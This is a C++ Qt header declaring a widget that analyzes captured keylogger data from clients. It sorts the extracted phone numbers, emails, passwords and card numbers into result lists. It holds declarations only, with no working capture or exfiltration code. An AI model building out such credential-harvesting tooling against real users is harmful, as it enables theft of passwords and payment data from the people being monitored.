#pragma once

#include <QWidget>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QTabWidget>
#include <QListWidget>
#include <QPushButton>
#include <QLabel>
#include <QProgressBar>
#include <QComboBox>
#include <QMessageBox>
#include <QDebug>
#include <QMap>

#include "../../utils/Analysis/LPTF_Analysis.hpp"
#include "../database/LPTF_Database.hpp"

/**
 * @brief Widget for analyzing keylogger data and displaying results
 */
class AnalysisWidget : public QWidget
{
    Q_OBJECT

public:
    explicit AnalysisWidget(QWidget *parent = nullptr);
    ~AnalysisWidget();

    // Set the database connection for data retrieval
    void setDatabase(LPTF_database* database);

public slots:
    void startAnalysis();
    void onAnalysisCompleted(const QMap<QString, AnalysisResult>& results);

private:
    void setupUI();
    QMap<QString, QString> getKeylogDataWithClients();
    void displayResults(const QMap<QString, AnalysisResult>& results);
    void clearResults();

    // UI Components
    QVBoxLayout* mainLayout_;
    QHBoxLayout* controlsLayout_;
    
    QPushButton* analyzeButton_;
    QProgressBar* progressBar_;
    QLabel* statusLabel_;
    
    QTabWidget* resultsTabWidget_;
    QListWidget* phonesListWidget_;
    QListWidget* emailsListWidget_;
    QListWidget* passwordsListWidget_;
    QListWidget* cardsListWidget_;
    
    // Analysis engine
    LPTF_Analysis* analyzer_;
    
    // Database connection
    LPTF_database* database_;
};